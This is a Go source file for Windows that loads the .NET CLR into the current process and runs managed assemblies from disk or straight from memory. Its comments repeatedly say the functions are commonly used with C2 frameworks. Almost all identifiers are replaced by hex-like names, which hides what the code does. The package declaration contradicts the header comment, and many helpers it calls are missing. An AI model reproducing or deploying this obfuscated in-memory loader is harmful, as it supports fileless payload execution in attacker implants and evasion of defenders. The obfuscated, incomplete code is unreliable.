//go:build windows
// +build windows

// Package clr is a PoC package that wraps Windows syscalls necessary to load and the CLR into the current process and
// execute a managed DLL from disk or a managed EXE from memory
package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// GetInstalledRuntimes is a wrapper function that returns an array of installed runtimes. Requires an existing ICLRMetaHost
func _22889435(_71b93ef9 *_12e239b6) ([]string, error) {
	var _5cc53ab8 []string
	_65d28be2, _a30f3ccf := _71b93ef9._3ce71b97()
	if _a30f3ccf != nil {
		return _5cc53ab8, _a30f3ccf
	}

	var _a0e7c2cc int
	for _a0e7c2cc != _4ef33ea8 {
		var _4ed69db5 *_8196dea4
		var _a5cba2b5 = uint32(0)
		_a0e7c2cc, _a30f3ccf = _65d28be2._319e9646(1, unsafe.Pointer(&_4ed69db5), &_a5cba2b5)
		if _a30f3ccf != nil {
			return _5cc53ab8, fmt.Errorf("InstalledRuntimes Next Error:\r\n%s\n", _a30f3ccf)
		}
		if _a0e7c2cc == _4ef33ea8 {
			break
		}
		// Only release if an interface pointer was returned
		_4ed69db5._2819d4ac()

		_da280012, _a30f3ccf := _4ed69db5._0a5d6565()
		if _a30f3ccf != nil {
			return _5cc53ab8, _a30f3ccf
		}
		_5cc53ab8 = append(_5cc53ab8, _da280012)
	}
	if len(_5cc53ab8) == 0 {
		return _5cc53ab8, fmt.Errorf("Could not find any installed runtimes")
	}
	return _5cc53ab8, _a30f3ccf
}

// ExecuteDLLFromDisk is a wrapper function that will automatically load the latest installed CLR into the current process
// and execute a DLL on disk in the default app domain. It takes in the target runtime, DLLPath, TypeName, MethodName
// and Argument to use as strings. It returns the return code from the assembly
func _d3b0f7b8(_fe9c7711, _6876a5df, _2d4528e1, _ffe0277f, _dca03192 string) (_2a644994 int16, _a30f3ccf error) {
	_2a644994 = -1
	if _fe9c7711 == "" {
		_fe9c7711 = "v4"
	}
	_71b93ef9, _a30f3ccf := _f5b5f41e(_43849882, _92ed0035)
	if _a30f3ccf != nil {
		return
	}

	_5cc53ab8, _a30f3ccf := _22889435(_71b93ef9)
	if _a30f3ccf != nil {
		return
	}
	var _ddb6becd string
	for _, _18a7b7b5 := range _5cc53ab8 {
		if strings.Contains(_18a7b7b5, _fe9c7711) {
			_ddb6becd = _18a7b7b5
			break
		} else {
			_ddb6becd = _18a7b7b5
		}
	}
	_4ed69db5, _a30f3ccf := _97617b08(_71b93ef9, _ddb6becd)
	if _a30f3ccf != nil {
		return
	}

	_3af9531e, _a30f3ccf := _4ed69db5._b2259ac6()
	if _a30f3ccf != nil {
		return
	}
	if !_3af9531e {
		return -1, fmt.Errorf("%s is not loadable for some reason", _ddb6becd)
	}
	_d27a3928, _a30f3ccf := _be1fe961(_4ed69db5)
	if _a30f3ccf != nil {
		return
	}

	_c278e806, _a30f3ccf := syscall.UTF16PtrFromString(_6876a5df)
	if _a30f3ccf != nil {
		return
	}
	_d56cbd2a, _a30f3ccf := syscall.UTF16PtrFromString(_2d4528e1)
	if _a30f3ccf != nil {
		return
	}
	_5b3f109d, _a30f3ccf := syscall.UTF16PtrFromString(_ffe0277f)
	if _a30f3ccf != nil {
		return
	}
	_5dd526c2, _a30f3ccf := syscall.UTF16PtrFromString(_dca03192)
	if _a30f3ccf != nil {
		return
	}

	_8d822e59, _a30f3ccf := _d27a3928._ab9d7077(_c278e806, _d56cbd2a, _5b3f109d, _5dd526c2)
	if _a30f3ccf != nil {
		return
	}
	if *_8d822e59 != 0 {
		return int16(*_8d822e59), fmt.Errorf("the ICLRRuntimeHost::ExecuteInDefaultAppDomain method returned a non-zero return value: %d", *_8d822e59)
	}

	_d27a3928._2819d4ac()
	_4ed69db5._2819d4ac()
	_71b93ef9._2819d4ac()
	return 0, nil
}

// ExecuteByteArray is a wrapper function that will automatically loads the supplied target framework into the current
// process using the legacy APIs, then load and execute an executable from memory. If no targetRuntime is specified, it
// will default to latest. It takes in a byte array of the executable to load and run and returns the return code.
// You can supply an array of strings as command line arguments.
func _653b0149(_fe9c7711 string, _6d843506 []byte, _11666973 []string) (_2a644994 int32, _a30f3ccf error) {
	_2a644994 = -1
	if _fe9c7711 == "" {
		_fe9c7711 = "v4"
	}
	_71b93ef9, _a30f3ccf := _f5b5f41e(_43849882, _92ed0035)
	if _a30f3ccf != nil {
		return
	}

	_5cc53ab8, _a30f3ccf := _22889435(_71b93ef9)
	if _a30f3ccf != nil {
		return
	}
	var _ddb6becd string
	for _, _18a7b7b5 := range _5cc53ab8 {
		if strings.Contains(_18a7b7b5, _fe9c7711) {
			_ddb6becd = _18a7b7b5
			break
		} else {
			_ddb6becd = _18a7b7b5
		}
	}
	_4ed69db5, _a30f3ccf := _97617b08(_71b93ef9, _ddb6becd)
	if _a30f3ccf != nil {
		return
	}

	_3af9531e, _a30f3ccf := _4ed69db5._b2259ac6()
	if _a30f3ccf != nil {
		return
	}
	if !_3af9531e {
		return -1, fmt.Errorf("%s is not loadable for some reason", _ddb6becd)
	}
	_d27a3928, _a30f3ccf := _0af4f255(_4ed69db5)
	if _a30f3ccf != nil {
		return
	}
	_d2d3ad38, _a30f3ccf := _dcf7a078(_d27a3928)
	if _a30f3ccf != nil {
		return
	}
	_184e40cb, _a30f3ccf := _f5037928(_6d843506)
	if _a30f3ccf != nil {
		return
	}

	_fec9970f, _a30f3ccf := _d2d3ad38._13500b2b(_184e40cb)
	if _a30f3ccf != nil {
		return
	}

	_73e56982, _a30f3ccf := _fec9970f.GetEntryPoint()
	if _a30f3ccf != nil {
		return
	}

	var _fbf7ea6e *_52965c54
	_891e741b, _a30f3ccf := _73e56982.GetString()
	if _a30f3ccf != nil {
		return
	}

	if _176f2599(_891e741b) {
		if _fbf7ea6e, _a30f3ccf = _b130eb4d(_11666973); _a30f3ccf != nil {
			return
		}
	}

	_4ad89d39 := _60f45b99{
		_6fec2b20:	1,
		_b52f9f3f:	uintptr(0),
	}
	_a30f3ccf = _73e56982._33f78d2f(_4ad89d39, _fbf7ea6e)
	if _a30f3ccf != nil {
		return
	}
	_d2d3ad38._2819d4ac()
	_d27a3928._2819d4ac()
	_4ed69db5._2819d4ac()
	_71b93ef9._2819d4ac()
	return 0, nil
}

// LoadCLR loads the target runtime into the current process and returns the runtimehost
// The intended purpose is for the runtimehost to be reused for subsequent operations
// throughout the duration of the program. Commonly used with C2 frameworks
func _8ebbde1c(_fe9c7711 string) (_d27a3928 *_f5ea272a, _a30f3ccf error) {
	if _fe9c7711 == "" {
		_fe9c7711 = "v4"
	}

	_71b93ef9, _a30f3ccf := _f5b5f41e(_43849882, _92ed0035)
	if _a30f3ccf != nil {
		return _d27a3928, fmt.Errorf("there was an error enumerating the installed CLR runtimes:\n%s", _a30f3ccf)
	}

	_5cc53ab8, _a30f3ccf := _22889435(_71b93ef9)
	_587fa871(fmt.Sprintf("Installed Runtimes: %v", _5cc53ab8))
	if _a30f3ccf != nil {
		return
	}
	var _ddb6becd string
	for _, _18a7b7b5 := range _5cc53ab8 {
		if strings.Contains(_18a7b7b5, _fe9c7711) {
			_ddb6becd = _18a7b7b5
		} else {
			_ddb6becd = _18a7b7b5
		}
	}
	_4ed69db5, _a30f3ccf := _97617b08(_71b93ef9, _ddb6becd)
	if _a30f3ccf != nil {
		return
	}

	_3af9531e, _a30f3ccf := _4ed69db5._b2259ac6()
	if _a30f3ccf != nil {
		return
	}
	if !_3af9531e {
		_a30f3ccf = fmt.Errorf("%s is not loadable for some reason", _ddb6becd)
	}

	return _0af4f255(_4ed69db5)
}

// ExecuteByteArrayDefaultDomain uses a previously instantiated runtimehost, gets the default AppDomain,
// loads the assembly into, executes the assembly, and then releases AppDomain
// Intended to be used by C2 frameworks to quickly execute an assembly one time
func _9039571f(_d27a3928 *_f5ea272a, _6d843506 []byte, _11666973 []string) (_6e4a0eae string, _d4783fa6 string) {
	_d2d3ad38, _a30f3ccf := _dcf7a078(_d27a3928)
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}
	_184e40cb, _a30f3ccf := _f5037928(_6d843506)
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	_fec9970f, _a30f3ccf := _d2d3ad38._13500b2b(_184e40cb)
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	_73e56982, _a30f3ccf := _fec9970f.GetEntryPoint()
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	var _fbf7ea6e *_52965c54
	_891e741b, _a30f3ccf := _73e56982.GetString()
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	if _176f2599(_891e741b) {
		if _fbf7ea6e, _a30f3ccf = _b130eb4d(_11666973); _a30f3ccf != nil {
			_d4783fa6 = _a30f3ccf.Error()
			return
		}
	}

	_4ad89d39 := _60f45b99{
		_6fec2b20:	1,
		_b52f9f3f:	uintptr(0),
	}

	_a30f3ccf = _73e56982._33f78d2f(_4ad89d39, _fbf7ea6e)
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	_fec9970f._2819d4ac()
	_d2d3ad38._2819d4ac()
	return
}

// LoadAssembly uses a previously instantiated runtimehost and loads an assembly into the default AppDomain
// and returns the assembly's methodInfo structure. The intended purpose is for the assembly to be loaded
// once but executed many times throughout the duration of the program. Commonly used with C2 frameworks
func _22b420ed(_d27a3928 *_f5ea272a, _6d843506 []byte) (_73e56982 *_3bb2fce1, _a30f3ccf error) {
	_d2d3ad38, _a30f3ccf := _dcf7a078(_d27a3928)
	if _a30f3ccf != nil {
		return
	}
	_184e40cb, _a30f3ccf := _f5037928(_6d843506)
	if _a30f3ccf != nil {
		return
	}

	_fec9970f, _a30f3ccf := _d2d3ad38._13500b2b(_184e40cb)
	if _a30f3ccf != nil {
		return
	}
	return _fec9970f.GetEntryPoint()
}

// InvokeAssembly uses the MethodInfo structure of a previously loaded assembly and executes it.
// The intended purpose is for the assembly to be executed many times throughout the duration of the
// program. Commonly used with C2 frameworks
func _09de6353(_73e56982 *_3bb2fce1, _11666973 []string) (_6e4a0eae string, _d4783fa6 string) {
	var _fbf7ea6e *_52965c54
	_891e741b, _a30f3ccf := _73e56982.GetString()
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		return
	}

	if _176f2599(_891e741b) {
		if _fbf7ea6e, _a30f3ccf = _b130eb4d(_11666973); _a30f3ccf != nil {
			_d4783fa6 = _a30f3ccf.Error()
			return
		}
	}

	_4ad89d39 := _60f45b99{
		_6fec2b20:	1,
		_b52f9f3f:	uintptr(0),
	}

	defer _9fa5b547(_fbf7ea6e)

	// Ensure exclusive access to read/write STDOUT/STDERR
	_5ad84997.Lock()
	defer _5ad84997.Unlock()

	_a30f3ccf = _73e56982._33f78d2f(_4ad89d39, _fbf7ea6e)
	if _a30f3ccf != nil {
		_d4783fa6 = _a30f3ccf.Error()
		// Don't return because there could be data on STDOUT/STDERR
	}

	// Read data from previously redirected STDOUT/STDERR
	if _5d394cec != nil {
		var _0787a2a8 string
		_6e4a0eae, _0787a2a8, _a30f3ccf = _8726ee7b()
		_d4783fa6 += _0787a2a8
		if _a30f3ccf != nil {
			_d4783fa6 += _a30f3ccf.Error()
		}
	}

	return
}
